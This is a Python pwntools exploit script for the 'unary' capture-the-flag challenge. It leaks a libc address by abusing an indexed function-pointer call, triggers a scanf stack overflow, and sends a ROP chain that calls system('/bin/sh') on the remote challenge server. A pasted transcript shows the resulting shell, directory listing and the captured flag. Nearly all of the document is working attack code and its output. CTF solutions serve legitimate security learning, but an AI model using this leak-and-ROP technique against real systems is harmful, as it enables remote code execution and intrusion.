from pwn import *

LOCAL = False#True#
# crush here 0x400835 <main+76> call QWORD PTR [r12+rbx*8], and we can control rbx
# r12 = 0x600e00

if LOCAL == True:
    r = process("./unary")
    gdb.attach(r,"b system\nc")
    system_off = 0x0004f440
    puts_off = 0x000809c0
    one_shot_off = 0x4f2c5
    bin_sh_off = 0x001b3e9a
else:
    r = remote("66.172.27.144", 9004)
    system_off = 0x0004f440
    puts_off = 0x000809c0
    one_shot_off = 0x4f2c5
    bin_sh_off = 0x001b3e9a


printf_plt = 0x4005f0
puts_got = 0x601018
per_s = 0x600916 #"%s"
### leaking GOT addr ###
r.recvuntil("Operator: ")
p = (0x601020 - 0x600e00) / 8
p = str(p)
log.success("payload: " + p)
r.sendline(p)
r.recvuntil("x = ")
r.sendline(str(puts_got))
data = r.recv()
leak = data[:6] + "\x00\x00"
leak = u64(leak)
libc_base = leak - puts_off
system = libc_base + system_off
bin_sh = libc_base + bin_sh_off
log.success("libc_base at: " + hex(libc_base))
log.success("system at: " + hex(system))
### calling __isoc99_scanf@GOT to gain stack overflow ###
p = (0x601038 - 0x600e00) / 8
log.success("payload:    " + hex(p))
p = str(p)
r.sendline(p)
r.recvuntil("x = ")
r.sendline(str(per_s))
### ROP here ###
time.sleep(0.2)
pop_rdi = 0x00000000004008d3
ret = 0x00000000004005be
p = "A"*44
p += p64(pop_rdi)
p += p64(bin_sh)
p += p64(ret)#used to allign
p += p64(system)
r.sendline(p)
time.sleep(0.2)
r.sendline("0")
r.interactive()

"""
$ python x.py
[+] Opening connection to 66.172.27.144 on port 9004: Done
[+] payload: 68
[+] libc_base at: 0x7ffa6e7df000
[+] system at: 0x7ffa6e82e440
[+] payload:    0x47
[*] Switching to interactive mode
f(x) = 1094795585
0. EXIT
1. x++
2. x--
3. ~x
4. -x
Operator: $ id
uid=999(pwn) gid=999(pwn) groups=999(pwn)
$ ls -al
total 28
drwxr-xr-x 1 root pwn  4096 Mar  3 09:11 .
drwxr-xr-x 1 root root 4096 Mar  3 09:11 ..
-r--r----- 1 root pwn    37 Feb 29 06:56 flag.txt
-r-xr-x--- 1 root pwn    37 Feb 29 06:52 redir.sh
-r-xr-x--- 1 root pwn  8920 Jan 21 12:25 unary
$ cat flag.txt
SUSEC{0p3r4710n_w17h_0n1y_1_0p3r4nd}
$
"""
